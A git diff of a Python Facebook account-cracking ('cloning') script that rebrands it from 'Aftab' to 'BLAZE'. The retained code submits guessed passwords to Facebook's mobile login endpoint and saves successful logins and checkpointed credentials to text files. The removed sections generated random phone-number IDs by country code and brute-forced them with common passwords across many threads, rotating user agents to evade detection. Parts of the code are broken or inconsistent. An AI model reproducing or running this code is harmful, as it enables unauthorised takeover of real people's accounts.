@@ -1,79 +1,4 @@
 
-#coding=utf-8
-#!/usr/bin/python3
-"""
-hello friends kese ho this is mr.Aftab
-to i hope ap sab thik honge 
-ajkal facebook ke sc ke ander method change krne ki zrorat ni
-q ke en 3 mounth se facebook ke ander m.basic chalta hai
-like facrbook ke all method again working bas 1 kam krna phrta hai
-Fresh user ugent kahi se dhondo or eske userugent change krlo
-then uske bad sc full lush hoga.
-agar kisi ko userugent ni milte muj se contact krlo mai deta hon
-Facebook acount name :- M R Aftab
-thanks :- allah hafiz
-"""
-#new userugrnt u can use this-----#
-"""
-Dalvik/2.1.0 (Linux; U; Android 8.1.0; LM-X415S Build/OPM1.171019.026)
-
-  Dalvik/2.1.0 (Linux; U; Android 11; AQUOS-TVX21B Build/RTM5.220609.268)
-
-  Dalvik/2.1.0 (Linux; U; Android 14; 21121210G Build/UKQ1.230917.001)
-
-  Dalvik/2.1.0 (Linux; U; Android 9; HiDPTAndroid Hi3751V560 Build/PPR1.180610.011)
-
-  Dalvik/2.1.0 (Linux; U; Android 11; NSTV FF Build/RTT2.220103.001)
-
-  Dalvik/2.1.0 (Linux; U; Android 9.0; HTZM-10 Build/O00623)
-
-  Dalvik/2.1.0 (Linux; U; Android 9; 8A001_A3 Build/PPR1.180610.011)
-
-  Dalvik/2.1.0 (Linux; U; Android 10.0; x96 Lite Build/QP1A.191105.004)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; XS97 R3 Build/QP1A.191105.004)
-
-  Dalvik/2.1.0 (Linux; U; Android 11; Xiaomi Watch 2 Pro Build/RWS2.221020.001.XM182.REL)
-
-  Dalvik/2.1.0 (Linux; U; Android 14; Pixel 7 Build/AP21.240119.009)
-
-  Dalvik/2.1.0 (Linux; U; Android 12.0; Q96MAX Build/NHG47L)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; MI 8 Build/SQ3A.220705.004)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; SmartT23 Build/SP1A.210812.016)
-
-  Dalvik/2.1.0 (Linux; U; Android 13; T609L Build/TP1A.220624.014)
-
-  Dalvik/2.1.0 (Linux; U; Android 11; moto g stylus (2022) Build/RRDES31.Q3-73-22-17)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; SMART_TV Build/SP1A.210812.016)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; moto e(7) plus Build/QPZ30.30-Q3-38-25)
-
-  Dalvik/2.1.0 (Linux; U; Android 14; 22041219NY Build/UP1A.231005.007)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; myPhone Jet Build/SP1A.210812.016)
-  
-  Dalvik/2.1.0 (Linux; U; Android 11; SGP321 Build/RQ3A.210805.019)
-
-  Dalvik/2.1.0 (Linux; U; Android 13; SGP321 Build/TD1A.220804.021)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ1B.191205.042)
-
-  Dalvik/2.1.0 (Linux; U; Android 13; SGP321 Build/TD1A.220804.039)
-
-  Dalvik/2.1.0 (Linux; U; Android 12; SGP321 Build/SQ3A.220705.018)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ2A.200501.007)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QP1A.190711.044)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QQ1A.200105.047)
-
-  Dalvik/2.1.0 (Linux; U; Android 11; SGP321 Build/RP1A.201005.003)
-
-  Dalvik/2.1.0 (Linux; U; Android 10; SGP321 Build/QD4A.200805.014)
 """
 #-----
 import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,platform,base64
@@ -175,7 +100,7 @@ loop = 0
 url_lookup = "https://lookup-id.com/"
 url_mb = "https://m.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 ###
@@ -280,7 +205,7 @@ url_lookup = "https://lookup-id.com/"
 url_mb = "https://x.facebook.com"
 url_ip = "https://www.httpbin.org/ip"
 url_graph = "https://graph.facebook.com/{}"
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 11; SM-A022G Build/RP1A.200720.012; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/104.0.5112.69 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36[FBAN/EMA;FBLC/ru_RU;FBAV/317.0.0.12.104;]"}
 bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
 done = False
 
@@ -306,20 +231,18 @@ def clear():
 	#
 def menu():
 	clear()
-	print('[1] File Cloning Auto  Pass  ')
-	print('[2] File Cloning Choice Pass ')
-	print('[3] Random number Cloning')
-	print('[4] File Create ')
+	print('[1] FILE CLONING AUTO PASS  ')
+	print('[2] FILE CLONING CHOICE PASS ')
 	print('[5] Exit')
 	linex()
-	Aftab=input('[•] Select Option :')
-	if Aftab =='1':
+	BLAZE=input('[•] Select Option :')
+	if BLAZE =='1':
 		__crack__().plerr()
-	if Aftab =='2':
+	if BLAZE =='2':
 		file()
-	if Aftab =='3':
+	if BLAZE =='3':
 		mrAftab()
-	if Aftab =='4':
+	if BLAZE =='4':
 		print('[•] For this scrpit contact with me');exit()
 	else:
 		print('[•] Select Right Option ');menu()
@@ -346,7 +269,7 @@ class __crack__:
             print ('')
             self.id = open(self.apk).read().splitlines()
         except:
-            print('\n \033[1;37m[!] \033[1;31mFile Not Found In Storage')
+            print('\n \033[1;37m[!] \033[1;31m FILE NOT FOUND')
             input('\n\033[1;37m[*] \033[1;36mPress Enter To Back');version()
         self.__pler__()
     def __mbasic__(self, user, _sempak_):
@@ -360,7 +283,7 @@ class __crack__:
             try:
                 Adiagents = random.choice(liners)
             except (KeyError, IOError):
-                Adiagents  = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/386.0.0.13.96;]'
+                Adiagents  = 'Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/en_GB;FBAV/386.0.0.13.96;]'
             ses = requests.Session()
             headers_ = {"Host":"mbasic.facebook.com","upgrade-insecure-requests":"1","user-agent":"Mozilla/5.0 (Linux; Android 8.1.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.2861.97 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             p = ses.get('https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F', headers=headers_).text
@@ -368,16 +291,16 @@ class __crack__:
             _headers = {"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://mbasic.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; Android 3.0.1; ALCATEL ONE TOUCH 4030A Build/JRO03C) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.2707.112 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"}
             po = ses.post("https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0", data = dataa, headers=_headers, allow_redirects = False)
             if 'c_user' in ses.cookies.get_dict():
-                print('\r\033[1;32m [AFTAB-Ok]\033[1;32m %s | %s      ' % (user,pw))
+                print('\r\033[1;32m [BLAZE-Ok]\033[1;32m %s | %s      ' % (user,pw))
                 wrt = '%s - %s' % (user,pw)
                 ok.append(wrt)
-                open('AFTAB-Ok.txt','a').write('%s\n' % wrt)
+                open('BLAZE-Ok.txt','a').write('%s\n' % wrt)
                 break
             elif 'checkpoint' in ses.cookies.get_dict():
-                print('\r\033[1;31m [AFTAB-CP]\033[1;31m %s | %s      ' % (user,pw))
+                print('\r\033[1;31m [BLAZE-CP]\033[1;31m %s | %s      ' % (user,pw))
                 wrt = '%s - %s' % (user,pw)
                 ok.append(wrt)
-                open('AFTAB-CP.txt','a').write('%s\n' % wrt)
+                open('BLAZE-CP.txt','a').write('%s\n' % wrt)
                 break
             else:
                 continue
@@ -425,28 +348,23 @@ class __crack__:
             time.sleep(1)
             self.__pler__()
             
-
+  Exit()
             
     
 
 logo="""
-        \033[1;36md8888  .d888 888             888      
-       \033[1;36md88888 d88P"  888             888      
-      \033[1;36md88P888 888    888             888      
-     \033[1;36md88P 888 888888 888888  8888b.  88888b.  
-    \033[1;36md88P  888 888    888        "88b 888 "88b 
-   \033[1;36md88P   888 888    888    .d888888 888  888 
-  \033[1;36md8888888888 888    Y88b.  888  888 888 d88P 
- \033[1;36md88P     888 888     "Y888 "Y888888 88888P"  
-                                             
+|_   _ \ |_   _|       / \     |  __   _||_   __  | 
+  | |_) |  | |         / _ \    |_/  / /    | |_ \_| 
+  |  __'.  | |   _    / ___ \      .'.' _   |  _| _  
+ _| |__) |_| |__/ | _/ /   \ \_  _/ /__/ | _| |__/ | 
+|_______/|________||____| |____||________||________|     
                             
-\033[1;37m--------------------- \033[1;35mAk \033[1;37m---------------------
+\033[1;37m--------------------- \033[1;35m \033[1;37m---------------------
 
-\033[1;32m→   Owner   :            Aftab \033[1;36m𓆩♡𓆪
-\033[1;32m→   Facebook:            Aftab khan
-\033[1;32m→  Tool Type:            \033[1;31mPaid  
-\033[1;32m→   Github  :            Private ha yaar
-\033[1;32m→   Version :            1.3
+\033[1;32m→   Owner   :RAZU HERO
+\033[1;32m→  Tool Type:FREE
+\033[1;32m→   Github  :BLAZE-XD            
+\033[1;32m→   Version :0.1
 
 \33[1;37m----------------------------------------------"""
 def linex():
@@ -635,65 +553,12 @@ url_ip = "https://www.httpbin.org/ip"
 
 url_graph = "https://graph.facebook.com/{}"
 
-header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
+header_grup = {"user-agent": "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"}
 
 bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
 
-#agen1 = ['NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile']
 
-#agen2 = ['NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+']
 
-###########################################################################################
-
-hhhh, iiii, jjjj, kkkk = "index.php?", "next=https%3A%2F%2Fdevelopers.facebook.com", "%2Ftools%2Fdebug", "%2Faccesstoken%2F"
-
-dddd, eeee, ffff, gggg = "login", "device-based", "validate-password", "?shbl=0"
-
-aaaa, bbbb, cccc = "tools", "debug", "accesstoken"
-
-#bahasa = "en-GB,en-US;q=0.9,en;q=0.8"
-
-bahasa = "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
-
-#bahasa = "en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7,id;q=0.6,bs;q=0.5"
-
-###########################################################################################
-
-## RANDOM UA
-
-#user_agent=['Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.137 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/96.0.4664.45 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/345.0.0.34.118;]','Mozilla/5.0 (Linux; Android 12) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4 Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/70.0.3538.80 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/198.0.0.53.101;]','Mozilla/5.0 (Linux; Android 12; SM-A205U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-A102U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-G960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SM-N960U) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q720) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-X420) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36','Mozilla/5.0 (Linux; Android 12; LM-Q710(FGN)) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.101 Mobile Safari/537.36']
-
-uas_bawaan = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]"
-
-uas_nokiac2 = "NokiaC2-00/2.0 (03.45) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 (Java; U; kau; nokiac2-00) UCBrowser8.3.0.154/70/352/UCWEB Mobile"
-
-uas_nokiax20 = "Mozilla/5.0 (Linux; Android 12; Nokia X20 Build/SKQ1.210821.001; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/98.0.4758.87 Mobile Safari/537.36"
-
-uas_nokiax = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)"
-
-uas_samsungse = "Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"
-
-uas_redmi9a = "Mozilla/5.0 (Linux; U; Android 10; id-id; Redmi 9A Build/QP1A.190711.020) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/89.0.4389.116 Mobile Safari/537.36"
-
-uas_nokiaxl = "Mozilla/5.0 (Linux; Android 4.1.2; Nokia_XL Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.82 Mobile Safari/537.36 NokiaBrowser/1.2.0.12"
-
-#uas_chromelinux = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36"
-
-#uas_j7prime = "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F Build/M1AJQ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Mobile Safari/537.36 OPR/51.1.2461.137501"
-
-uas_tes = "Mozilla/5.0 (Linux; Android 7.0; Redmi Note 4X Build/MiUI MS; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/65.0.3325.109 Mobile Safari/537.36 Instagram 38.0.0.13.95 Android (24/7.0; 480dpi; 1080x1920; Xiaomi/xiaomi; Redmi Note 4X; mido; qcom; ru_RU; 99640911)"
-
-uas_random = random.choice(["Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 12; SAMSUNG SM-G780G) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/16.0 Chrome/92.0.4515.166 Mobile Safari/537.36"])
-
-uas_nokiac3 = "NokiaC3-00/5.0 (08.63) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+"
-
-uas_iphone = "Mozilla/5.0 (iPhone; CPU iPhone OS 13_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone11,8;FBMD/iPhone;FBSN/iOS;FBSV/13.3.1;FBSS/2;FBID/phone;FBLC/en_US;FBOP/5;FBCR/]"
-
-uas_nokia5plus = "Mozilla/5.0 (Linux; Android 10; Nokia 5.1 Plus Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, seperti Gecko) Versi/4.0 Chrome/83.0.4103.106 Mobile Safari/537.36"
-
-uas_random2 = random.choice(["Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]","Mozilla/5.0 (Linux; Android 4.4.4; en-au; SAMSUNG SM-N915G Build/KTU84P) AppleWebKit/537.36 (KTHML, like Gecko) Version/2.0 Chrome/34.0.1847.76 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 4.1.2; Nokia_X Build/JZO54K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/27.0.87.90 Mobile Safari/537.36 NokiaBrowser/1.0,gzip(gfe)","Mozilla/5.0 (Linux; U; Android 4.4.2; zh-CN; HUAWEI MT7-TL00 Build/HuaweiMT7-TL00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/40.0.2214.89 UCBrowser/11.3.8.909 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 10; M2006C3MG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Mobile Safari/537.36","Mozilla/5.0 (Linux; Android 7.0; SM-G930VC Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/58.0.3029.83 Mobile Safari/537.36"])
-
-# lempankkkkkkkk
 
 ugen2=[]
 
@@ -861,270 +726,8 @@ Apk = []
 oks = []
 cps = []
 				
-def mrAftab():
-	os.system('clear')
-	print(logo)
-	print('[1] Pak Random Cloning ')
-	print('[2] B D Random Cloning  ')
-	print('[3] Choice Pass Cloning')
-	print('\x1b[1;91m[4]  Exit Programe')
-	linex()
-	Aftab=input(' Select option : ')
-	if Aftab =='1':
-		Aftab1()
-	if Aftab =='2':
-		Aftab2()
-	if Aftab =='4':
-		exit()
-	if Aftab =='3':
-		choice()
-	if Aftab =='5':
-		exit()
-def Aftab2():
-	os.system('clear')
-	print(logo)
-	print('[1] Bangla Random Cloning')
-	print('[2] India Random Cloning')
-	print('\x1b[1;91m[3] Go to main menu')
-	linex()
-	Aftab=input(' Select option : ')
-	if Aftab =='1':
-		bd()
-	if Aftab =='2':
-		india()
-	if Aftab =='3':
-		menu()
-def Aftab1():
-	os.system('clear')
-	print(logo)
-	print('[1] Random Cloning M [1] ')
-	print('[2] Random Cloning M [2] ')
-	print('[3] Random Cloning M [3] ')
-	print('[4] Random Cloning M [4] ')
-	print('[5] Random Cloning M [5]  ')
-	print('\x1b[1;91m[6] Go to main menu')
-	linex()
-	Aftab=input(' Select option : ')
-	if Aftab =='1':
-		m1()
-	if Aftab =='2':
-		m2()
-	if Aftab =='3':
-		m3()
-	if Aftab =='4':
-		m4()
-	if Aftab =='5':
-		m5()
-	if Aftab =='6':
-		menu()
-def m1():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
-	linex()
-	kode = input('[+]\033[1;37m Your Code : ')
-	os.system('clear')
-	print(logo)
-	print('[•] Example : 1000,5000,100000,*****Etc ')
-	linex()
-	limit = int(input('[•] Your Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[•] Total Acounts : '+tl)
-		print('[•] Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru]
-			yaari.submit(rcrack,uid,pwx,tl)
-	linex()
-	print('Crack process has been completed')
-	print('Ids saved in ok.txt,cp.txt')
-	linex()
-	exit()
-def m2():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
-	linex()
-	kode = input('[+]\033[1;37m Your Code : ')
-	os.system('clear')
-	print(logo)
-	print('[•] Example : 1000,5000,100000,*****Etc ')
-	linex()
-	limit = int(input('[•] Your Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[•] Total Acounts : '+tl)
-		print('[•] Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,kode+guru,'khan1122']
-			yaari.submit(rcrack,uid,pwx,tl)
-	linex()
-	print('Crack process has been completed')
-	print('Ids saved in ok.txt,cp.txt')
-	linex()
-	exit()
-def m3():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
-	linex()
-	kode = input('[+]\033[1;37m Your Code : ')
-	os.system('clear')
-	print(logo)
-	print('[•] Example : 1000,5000,100000,*****Etc ')
-	linex()
-	limit = int(input('[•] Your Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[•] Total Acounts : '+tl)
-		print('[•] Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru+kode,'khan12','khan1122','khan12345','khan123']
-			yaari.submit(rcrack,uid,pwx,tl)
-	linex()
-	print('Crack process has been completed')
-	print('Ids saved in ok.txt,cp.txt')
-	linex()
-	exit()
-def m4():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
-	linex()
-	kode = input('[+]\033[1;37m Your Code : ')
-	os.system('clear')
-	print(logo)
-	print('[•] Example : 1000,5000,100000,*****Etc ')
-	linex()
-	limit = int(input('[•] Your Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[•] Total Acounts : '+tl)
-		print('[•] Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,'khan786','khan12345','khan123','khan1234','khan1122','janjan']
-			yaari.submit(rcrack,uid,pwx,tl)
-	linex()
-	print('Crack process has been completed')
-	print('Ids saved in ok.txt,cp.txt')
-	linex()
-	exit()
-def m5():
-	uid=[]
-	os.system('clear')
-	print(logo)
-	print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
-	linex()
-	kode = input('[+]\033[1;37m Your Code : ')
-	os.system('clear')
-	print(logo)
-	print('[•] Example : 1000,5000,100000,*****Etc ')
-	linex()
-	limit = int(input('[•] Your Idz lemit :  '))
-	for nmbr in range(limit):
-		nmp = ''.join(random.choice(string.digits) for _ in range(7))
-		uid.append(nmp)
-	with ThreadPool(max_workers=65) as yaari:
-		os.system('clear')
-		print(logo)
-		tl = str(len(uid))
-		print('[•] Total Acounts : '+tl)
-		print('[•] Selected Code : \x1b[1;92m'+kode)
-		print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
-		linex()
-		for guru in uid:
-			uid = kode+guru
-			pwx = [guru,'baloch','malik786','baloch123','khan12345','khan123','afghan123','pubg123']
-			yaari.submit(rcrack,uid,pwx,tl)
-	linex()
-	print('Crack process has been completed')
-	print('Ids saved in ok.txt,cp.txt')
-	linex()
-	exit()
+	
 
-#___xhoice pass____
-def choice():
-    uid=[]
-    twf =[]
-    os.getuid
-    os.geteuid
-    os.system("clear")
-    print(logo)
-    print('\033[1;31m[•] NOT : PUT 92306,92304,92317 etc')
-    linex()
-    code = input('[•] PUT CODE : ')
-    os.system('clear')
-    print(logo)
-    print('[•] Example : 1000,5000,100000,*****Etc ')
-    linex()
-    limit = int(input('[•] Your Idz lemit :  '))
-    for nmbr in range(limit):
-        nmp = ''.join(random.choice(string.digits) for _ in range(7))
-        uid.append(nmp)
-    os.system("clear")
-    print(logo)
-    print('[•] Example : 1/ 2/ 3/ 4/ 5/ 6/ 7/ 8/ 9**ETC ')
-    linex()
-    passx = int(input("[•] Enter Password Limit : "))
-    PROID = []
-    os.system('clear')
-    print(logo)
-    print('[•] Example : khankhan,baloch,khan786,mlik786**Etc')
-    linex()
-    for Aftab in range(passx):
-        pww = input(f"[•] Enter Password {Aftab+1} : ")
-        mrAftab.append(pww)
-    with ThreadPool(max_workers=50) as yaari: 	        
-        os.system('clear')
-        print(logo)
-        tl = str(len(uid))
-        print('[•] Total Acounts : '+tl)
-        print('[•] Selected Code : \x1b[1;92m'+code)
-        print('\x1b[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️')
-        linex()
-        for love in uid:
-            pwx = [love[1:]]
-            uid = code+love
-            for PRO in mrAftab:
-                pwx.append(PRO)
-                pwx.append(love)
-            yaari.submit(rcrack,uid,pwx,tl)
 #_______
 def india():
 	uid=[]
@@ -1475,7 +1078,7 @@ def method():
     os.system("clear")
     print(logo) 
     print(f'[•] Total Ids : \033[1;92m'+str(len(accounts)))
-    print(f"\033[1;91m[•] If you no result use ✈️ ✈️ flight mode ✈️ ✈️")
